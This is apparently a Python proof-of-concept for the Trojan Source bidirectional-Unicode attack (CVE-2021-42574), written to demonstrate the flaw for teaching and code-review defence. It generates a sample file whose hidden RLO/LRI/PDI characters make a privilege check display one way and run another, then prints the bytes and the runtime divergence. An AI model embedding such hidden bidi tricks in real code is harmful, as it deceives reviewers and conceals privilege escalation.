"""
PoC: Bidi Trojan Source — "stretched-string" attack (CVE-2021-42574)

Reference: Boucher & Anderson, "Trojan Source: Invisible Vulnerabilities"
           https://trojansource.codes/

Idea:
    Unicode has bidirectional override control characters that re-order how
    text is *displayed* on screen — but the parser still reads bytes in
    logical order. So you can craft a Python source file whose visible
    rendering shows ONE thing but whose actual byte content (and resulting
    runtime behavior) is DIFFERENT.

This PoC:
    1. Writes samples/trojan_sample.py — a privilege-check that, when read
       by a human reviewer in most editors / GitHub's web viewer, looks
       like it grants "regular user access". The bytes actually make the
       comparison fail, so the *else* branch runs and grants admin.
    2. Prints both views (rendered + raw bytes) so you can see the gap.
    3. Executes the file and shows that runtime behavior diverges from
       the rendered review.

Bidi control characters used:
    U+202A LRE   Left-to-Right Embedding
    U+202B RLE   Right-to-Left Embedding
    U+202C PDF   Pop Directional Formatting
    U+202D LRO   Left-to-Right Override
    U+202E RLO   Right-to-Left Override   <- used here
    U+2066 LRI   Left-to-Right Isolate    <- used here
    U+2067 RLI   Right-to-Left Isolate
    U+2068 FSI   First Strong Isolate
    U+2069 PDI   Pop Directional Isolate  <- used here

Run:
    python pocs/01_bidi_trojan_source.py
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

SAMPLES_DIR = Path(__file__).resolve().parent.parent / "samples"
SAMPLES_DIR.mkdir(exist_ok=True)
TARGET = SAMPLES_DIR / "trojan_sample.py"

RLO = "‮"  # Right-to-Left Override
LRI = "⁦"  # Left-to-Right Isolate
PDI = "⁩"  # Pop Directional Isolate


def build_trojan_sample() -> None:
    """
    Build a Python file where a string literal contains hidden bidi chars
    so it renders as a short string + an inline comment, but actually
    holds a longer value. The downstream `==` check therefore fails, and
    the supposedly-unreachable else-branch grants admin access.
    """
    code = (
        '#!/usr/bin/env python3\n'
        '"""Trojan Source sample — visible rendering lies about the byte content."""\n'
        '\n'
        f'access_level = "user{RLO} {LRI}# Check if admin{PDI} {LRI}"\n'
        '\n'
        '# A reviewer scanning this in GitHub or VS Code will SEE:\n'
        '#     access_level = "user"  # Check if admin\n'
        '#\n'
        '# ... and reasonably conclude: "ok, normal user, harmless".\n'
        '\n'
        'if access_level == "user":\n'
        '    print("[GRANTED] regular user access (what the reviewer expects)")\n'
        'else:\n'
        '    print("[GRANTED] ADMIN access — silent privilege escalation")\n'
    )
    TARGET.write_text(code, encoding="utf-8")


def show_visible_vs_bytes() -> None:
    raw = TARGET.read_bytes()
    text = TARGET.read_text(encoding="utf-8")
    print("=" * 72)
    print(f"Sample file: {TARGET}")
    print("=" * 72)

    print("\n--- 1. What an editor / web viewer renders ---\n")
    print(text)

    print("--- 2. Per-line repr (what the parser actually sees) ---\n")
    for i, line in enumerate(text.splitlines(), start=1):
        markers = []
        if "‮" in line:
            markers.append("RLO U+202E")
        if "⁦" in line:
            markers.append("LRI U+2066")
        if "⁩" in line:
            markers.append("PDI U+2069")
        tag = f"   <-- contains bidi: {', '.join(markers)}" if markers else ""
        print(f"  L{i}: {line!r}{tag}")

    print("\n--- 3. Hex of the suspicious assignment line ---\n")
    for line in text.splitlines():
        if "‮" in line:
            b = line.encode("utf-8")
            print(f"    bytes ({len(b)} total):")
            print(f"      {b.hex(' ')}")
            print(f"    bidi marker offsets:")
            for char_idx, ch in enumerate(line):
                if ch in ("‮", "⁦", "⁩"):
                    name = {"‮": "RLO", "⁦": "LRI", "⁩": "PDI"}[ch]
                    print(f"      char {char_idx:3}: U+{ord(ch):04X}  {name}")
    print(f"\n  Total file bytes: {len(raw)}\n")


def run_and_show_runtime_behavior() -> None:
    print("--- 4. Executing the sample ---\n")
    result = subprocess.run(
        [sys.executable, str(TARGET)],
        capture_output=True,
        text=True,
        check=False,
    )
    out = (result.stdout or "").rstrip()
    print(f"  stdout: {out or '<empty>'}")
    if result.stderr:
        print(f"  stderr: {result.stderr.rstrip()}")

    print("\n--- 5. Reviewer expectation vs. actual runtime ---\n")
    print('  Reviewer reads:   access_level = "user"   ->  "user" == "user" is True')
    print('  Expected output:  "[GRANTED] regular user access"')
    print(f"  Actual output:    {out!r}")
    if "ADMIN" in out:
        print("\n  ** Divergence confirmed — Trojan Source attack succeeded. **")
    print()


def main() -> int:
    build_trojan_sample()
    show_visible_vs_bytes()
    run_and_show_runtime_behavior()
    print("Open samples/trojan_sample.py in your editor or on GitHub to")
    print("see the rendering trick. Then run pocs/99_detect_bidi.py to flag")
    print("files like this during a code review.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
